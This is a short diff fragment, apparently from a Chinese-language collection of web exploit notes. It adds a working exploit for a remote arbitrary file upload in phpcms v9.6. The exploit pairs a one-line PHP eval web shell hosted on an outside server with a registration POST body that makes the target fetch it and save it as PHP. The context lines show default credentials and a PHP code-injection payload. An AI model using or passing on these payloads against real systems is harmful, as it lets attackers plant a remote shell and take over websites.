@@ -16,3 +16,16 @@ admin/admin
 ```
 1111";}<?php phpinfo() ?>
 ```
+
+
+^
+## **phpcms v9.6**
+安装路径/install/install.php
+存在远程任意文件上传
+```
+http://xx.xx.xx.xx/1.txt存放内容如下:
+<?php @eval($_POST[zf]);?>
+
+
+siteid=1&modelid=11&username=test452&password=test2123&email=test2154@163.com&info[content]=<img src=http://xx.xx.xx.xx/1.txt?.php#.jpg>&dosubmit=1&protocol=
+```
